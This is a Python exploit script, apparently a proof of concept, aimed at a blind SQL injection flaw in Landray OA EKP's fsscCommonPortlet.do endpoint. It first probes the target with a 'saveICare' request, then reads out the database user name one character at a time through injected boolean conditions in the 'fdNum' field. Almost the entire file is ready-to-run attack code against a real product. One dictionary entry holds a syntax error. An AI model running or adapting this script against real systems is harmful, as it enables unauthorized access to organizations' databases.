#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import sys
import requests
import re
import urllib
import urllib3

urllib3.disable_warnings()

header = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
}


def exploit_user(url):
    user_name = ""
    for i in range(1, 20):
        low = 1
        top = 255
        mid = (low + top) // 2
        while low < top:
            send_data = {
                "method": "getICareByFdId",
                "ordertype": "down",
                "fdNum": "aNsSl' or ascii(substring((user_name()),{},1)) < {} and '1'='1".format(
                    i, mid)
            }
            res = requests.post(url, data=send_data, headers=header)
            if "docSubject" in res.text:
                top = mid
            else:
                low = mid + 1
            mid = (top + low) // 2
        if mid <= 1 or mid >= 254:
            break
        user_name = user_name + chr(mid - 1)
        print("[+]user_name:{}".format(user_name))
        print("\033[F", end="")
    return user_name

def verify(url):
    req_url = url.strip("/") + "/fssc/common/fssc_common_portlet/fsscCommonPortlet.do"

    step_data = {
        "method":"saveICare",
        "fdId:"","
        "fdNum":"1",
        "docSubject":"1",
        "fdName":"test",
        "createTime":"1",
        "fdStatus":"1"
    }
    req1 = requests.post(req_url,data=step_data,headers=header, verify=False)
    if req1.status_code == 200 and "result" in req1.text:
        print("[+]Vuln exist，start select username:")
        username = exploit_user(req_url)
    else:
        print("[-]Vuln not exist.")
        exit(0)
    return username


    
if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Winows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 landray-oa-ekp-fsscCommonPortlet-sqli.py ",target)
    data = verify(target)
    if data != "":
        print("[+]漏洞存在，查询当前用户名为：", data)
    else:
        print("[-]漏洞不存在")
